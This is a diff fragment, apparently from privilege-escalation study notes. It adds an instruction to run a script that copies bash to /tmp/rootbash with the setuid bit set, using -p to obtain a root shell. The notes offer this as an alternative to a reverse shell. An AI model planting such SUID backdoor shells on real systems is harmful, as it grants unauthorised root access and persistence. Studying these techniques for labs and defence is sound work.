@@ -521,3 +521,5 @@ Dont take a reverse shell do this instead:
 #!/bin/bash
 cp /bin/bash /tmp/rootbash
 chmod +s /tmp/rootbash
+Once the /tmp/rootbash file is created, execute it (with 
+-p to preserve the effective UID) to gain a root shell:
